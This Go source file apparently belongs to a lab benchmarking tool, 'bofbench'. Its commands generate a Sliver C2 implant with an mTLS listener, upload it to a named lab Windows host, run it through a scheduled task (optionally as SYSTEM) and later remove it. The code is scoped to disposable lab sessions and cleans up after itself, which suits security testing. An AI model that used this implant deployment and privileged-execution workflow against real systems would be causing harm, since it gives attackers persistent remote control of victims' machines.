package app

import (
	"context"
	"crypto/sha256"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/professor-moody/bofbench/internal/lab"
	"github.com/professor-moody/bofbench/internal/runlog"
	"github.com/professor-moody/bofbench/internal/runtimecontrol"
)

type sliverLabSessionReceipt struct {
	Schema        string `json:"schema"`
	SchemaVersion int    `json:"schema_version"`
	RunID         string `json:"run_id"`
	Action        string `json:"action"`
	Control       string `json:"control,omitempty"`
	Lab           string `json:"lab"`
	Architecture  string `json:"architecture,omitempty"`
	Context       string `json:"context,omitempty"`
	ControlHost   string `json:"control_host,omitempty"`
	Session       string `json:"session,omitempty"`
	RemotePath    string `json:"remote_path,omitempty"`
	ObjectSHA256  string `json:"implant_sha256,omitempty"`
	Status        string `json:"status"`
	StartedAt     string `json:"started_at"`
	CompletedAt   string `json:"completed_at"`
	ReceiptPath   string `json:"receipt_path"`
	Error         string `json:"error,omitempty"`
}

func sliverLabSessionCommand(stdout io.Writer, options *sliverOptions) *cobra.Command {
	cmd := &cobra.Command{Use: "lab-session", Short: "Create and remove disposable Sliver sessions on named BOFBench labs"}
	cmd.AddCommand(sliverLabSessionStartCommand(stdout, options), sliverLabSessionStopCommand(stdout, options))
	return cmd
}

func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cobra.Command {
	var controlName, controlsPath, arch, sessionContext, format string
	var timeout time.Duration
	cmd := &cobra.Command{Use: "start", Short: "Generate, launch, and wait for one disposable lab-only session", Args: cobra.NoArgs}
	cmd.RunE = func(cmd *cobra.Command, _ []string) error {
		if options.Lab == "" {
			return fmt.Errorf("--lab is required")
		}
		arch = strings.ToLower(strings.TrimSpace(arch))
		sessionContext = strings.ToLower(strings.TrimSpace(sessionContext))
		if arch != "x64" && arch != "x86" {
			return fmt.Errorf("architecture must be x64 or x86")
		}
		if sessionContext != "user" && sessionContext != "system" {
			return fmt.Errorf("context must be user or system")
		}
		config, err := runtimecontrol.Load(controlsPath)
		if err != nil {
			return err
		}
		resolvedName, control, err := runtimecontrol.Resolve(config, controlName)
		if err != nil {
			return err
		}
		if control.Runtime != "sliver" {
			return fmt.Errorf("runtime control %s is for %s, not sliver", resolvedName, control.Runtime)
		}
		controlProfile, err := runtimecontrol.LabProfile(control)
		if err != nil {
			return err
		}
		providerStatus, err := lab.RunProviderAction(cmd.Context(), "runtime-control-"+resolvedName, controlProfile, "status", lab.ProviderActionOptions{})
		if err != nil {
			return err
		}
		if providerStatus.Resource.State != "running" || providerStatus.Resource.GuestIPv4 == "" {
			return fmt.Errorf("Sliver control %s is not ready (state=%s host=%s); run 'bofbench runtime control up %s' and configure the pinned server first", resolvedName, providerStatus.Resource.State, providerStatus.Resource.GuestIPv4, resolvedName)
		}
		resolvedLab, err := lab.ResolveProfile(options.Lab, ".", options.Profiles)
		if err != nil {
			return err
		}
		remote, err := lab.ResolveRemoteOptions(cmd.Context(), resolvedLab.Name, resolvedLab.Profile)
		if err != nil {
			return err
		}
		status, err := lab.RemoteStatus(cmd.Context(), remote)
		if err != nil {
			return err
		}
		resolvedOptions, err := resolveSliverOptions(*options, ".", false)
		if err != nil {
			return err
		}
		runDir, err := runlog.NewDir("sliver-lab-session")
		if err != nil {
			return err
		}
		receipt := sliverLabSessionReceipt{Schema: "bofbench.sliver-lab-session", SchemaVersion: 1, RunID: runlog.ID(runDir), Action: "start", Control: resolvedName, Lab: resolvedLab.Name, Architecture: arch, Context: sessionContext, ControlHost: providerStatus.Resource.GuestIPv4, Status: "running", StartedAt: time.Now().UTC().Format(time.RFC3339Nano), ReceiptPath: filepath.Join(runDir, "session.json")}
		finish := func(runErr error) error {
			receipt.CompletedAt = time.Now().UTC().Format(time.RFC3339Nano)
			receipt.Status = "complete"
			if runErr != nil {
				receipt.Status, receipt.Error = "failed", runErr.Error()
			}
			if writeErr := writeJSON(receipt.ReceiptPath, receipt); writeErr != nil && runErr == nil {
				runErr = writeErr
			}
			if format == "json" {
				_ = printJSON(stdout, receipt)
			}
			return runErr
		}
		localImplant := filepath.Join(runDir, fmt.Sprintf("bofbench-sliver-%s-%s.exe", arch, runlog.ID(runDir)))
		sliverArch := "amd64"
		if arch == "x86" {
			sliverArch = "386"
		}
		quoted, _ := sliverConsoleQuote(localImplant)
		rc := fmt.Sprintf("mtls --lhost 0.0.0.0 --lport 8888\ngenerate --mtls %s:8888 --os windows --arch %s --format exe --save %s\nexit\n", providerStatus.Resource.GuestIPv4, sliverArch, quoted)
		generateCtx, generateCancel := context.WithTimeout(cmd.Context(), timeout)
		output, generateErr := runSliverRCContext(generateCtx, resolvedOptions.Client, rc)
		generateCancel()
		if generateErr != nil {
			return finish(fmt.Errorf("generate disposable Sliver session: %w", generateErr))
		}
		if _, statErr := os.Stat(localImplant); statErr != nil {
			return finish(fmt.Errorf("Sliver did not create %s: %w: %s", localImplant, statErr, strings.TrimSpace(stripANSI(output))))
		}
		hash, err := sha256File(localImplant)
		if err != nil {
			return finish(err)
		}
		receipt.ObjectSHA256 = hash
		remotePath := fmt.Sprintf(`C:\bofbench\sessions\bofbench-sliver-%s-%s.exe`, arch, runlog.ID(runDir))
		receipt.RemotePath = remotePath
		if _, stderr, mkdirErr := lab.ExecutePowerShell(cmd.Context(), remote, `$ErrorActionPreference='Stop'; New-Item -ItemType Directory -Path 'C:\bofbench\sessions' -Force | Out-Null`); mkdirErr != nil {
			return finish(fmt.Errorf("prepare session directory: %w: %s", mkdirErr, strings.TrimSpace(string(stderr))))
		}
		if _, stderr, uploadErr := lab.UploadFile(cmd.Context(), remote, localImplant, remotePath); uploadErr != nil {
			return finish(fmt.Errorf("upload session executable: %w: %s", uploadErr, strings.TrimSpace(string(stderr))))
		}
		launch := fmt.Sprintf(`$ErrorActionPreference='Stop'; $path=%s; if((Get-FileHash -Algorithm SHA256 -LiteralPath $path).Hash.ToLower() -ne %s){throw 'session executable hash mismatch'}; `, psLiteral(remotePath), psLiteral(hash))
		task := "BOFBench-Sliver-" + runlog.ID(runDir)
		launch += fmt.Sprintf(`$action=New-ScheduledTaskAction -Execute $path; `)
		if sessionContext == "system" {
			launch += fmt.Sprintf(`$principal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName %s -Action $action -Principal $principal -Force|Out-Null; Start-ScheduledTask -TaskName %s`, psLiteral(task), psLiteral(task))
		} else {
			launch += fmt.Sprintf(`$account=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; $principal=New-ScheduledTaskPrincipal -UserId $account -LogonType S4U -RunLevel Highest; Register-ScheduledTask -TaskName %s -Action $action -Principal $principal -Force|Out-Null; Start-ScheduledTask -TaskName %s`, psLiteral(task), psLiteral(task))
		}
		if _, stderr, launchErr := lab.ExecutePowerShell(cmd.Context(), remote, launch); launchErr != nil {
			return finish(fmt.Errorf("launch session: %w: %s", launchErr, strings.TrimSpace(string(stderr))))
		}
		selector := strings.TrimSpace(resolvedLab.Profile.SliverSession)
		if selector == "" {
			selector = status.ComputerName
		}
		resolvedOptions.SessionFilter = selector
		waitCtx, cancel := context.WithTimeout(cmd.Context(), timeout)
		defer cancel()
		var session string
		for session == "" {
			session, err = findSliverSession(resolvedOptions)
			if err == nil {
				break
			}
			select {
			case <-waitCtx.Done():
				return finish(fmt.Errorf("session %s did not become live within %s", selector, timeout))
			case <-time.After(3 * time.Second):
			}
		}
		receipt.Session = session
		if format == "text" {
			fmt.Fprintf(stdout, "Sliver lab session ready\ncontrol   %s (%s)\nlab       %s (%s)\narch      %s\ncontext   %s\nsession   %s\nreceipt   %s\n", resolvedName, providerStatus.Resource.GuestIPv4, resolvedLab.Name, status.ComputerName, arch, sessionContext, session, receipt.ReceiptPath)
		}
		return finish(nil)
	}
	cmd.Flags().StringVar(&controlName, "control", "", "runtime control-plane profile")
	cmd.Flags().StringVar(&controlsPath, "controls", runtimecontrol.Path(), "runtime control profiles file")
	cmd.Flags().StringVar(&arch, "arch", "x64", "session architecture: x64 or x86")
	cmd.Flags().StringVar(&sessionContext, "context", "user", "session context: user or system")
	cmd.Flags().DurationVar(&timeout, "timeout", 3*time.Minute, "live session wait timeout")
	cmd.Flags().StringVar(&format, "format", "text", "output format: text or json")
	return cmd
}

func sliverLabSessionStopCommand(stdout io.Writer, options *sliverOptions) *cobra.Command {
	var format string
	var cleanup bool
	cmd := &cobra.Command{Use: "stop", Short: "Stop and remove only BOFBench disposable Sliver session artifacts", Args: cobra.NoArgs}
	cmd.RunE = func(cmd *cobra.Command, _ []string) error {
		_ = cleanup // stop is cleanup-only; the flag makes that intent explicit and preserves the documented interface.
		if options.Lab == "" {
			return fmt.Errorf("--lab is required")
		}
		resolved, err := lab.ResolveProfile(options.Lab, ".", options.Profiles)
		if err != nil {
			return err
		}
		remote, err := lab.ResolveRemoteOptions(cmd.Context(), resolved.Name, resolved.Profile)
		if err != nil {
			return err
		}
		runDir, err := runlog.NewDir("sliver-lab-session-stop")
		if err != nil {
			return err
		}
		receipt := sliverLabSessionReceipt{Schema: "bofbench.sliver-lab-session", SchemaVersion: 1, RunID: runlog.ID(runDir), Action: "stop", Lab: resolved.Name, Status: "running", StartedAt: time.Now().UTC().Format(time.RFC3339Nano), ReceiptPath: filepath.Join(runDir, "session.json")}
		script := `$ErrorActionPreference='Stop'; Get-ScheduledTask -TaskName 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}; Get-Service -Name 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-Service $_.Name -Force -ErrorAction SilentlyContinue; sc.exe delete $_.Name|Out-Null}; Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\bofbench-sliver-*.exe'}|ForEach-Object{Stop-Process -Id $_.ProcessId -Force}; Remove-Item -LiteralPath 'C:\bofbench\sessions' -Recurse -Force -ErrorAction SilentlyContinue; $remaining=@(Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\*'}).Count; if($remaining -ne 0){throw 'session processes remain'}; [ordered]@{status='complete';remaining=$remaining}|ConvertTo-Json -Compress`
		output, stderr, runErr := lab.ExecutePowerShell(cmd.Context(), remote, script)
		receipt.CompletedAt = time.Now().UTC().Format(time.RFC3339Nano)
		receipt.Status = "complete"
		if runErr != nil {
			receipt.Status, receipt.Error = "failed", fmt.Sprintf("%v: %s", runErr, strings.TrimSpace(string(stderr)))
		}
		if err := writeJSON(receipt.ReceiptPath, receipt); err != nil && runErr == nil {
			runErr = err
		}
		if format == "json" {
			_ = printJSON(stdout, receipt)
		} else {
			fmt.Fprintf(stdout, "Sliver lab session cleanup %s\nlab      %s\nresult   %s\nreceipt  %s\n", receipt.Status, resolved.Name, strings.TrimSpace(string(output)), receipt.ReceiptPath)
		}
		return runErr
	}
	cmd.Flags().StringVar(&format, "format", "text", "output format: text or json")
	cmd.Flags().BoolVar(&cleanup, "cleanup", false, "explicitly request removal of disposable session artifacts (stop is cleanup-only)")
	return cmd
}

func sha256File(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%x", sha256Bytes(data)), nil
}

func sha256Bytes(data []byte) [32]byte { return sha256.Sum256(data) }
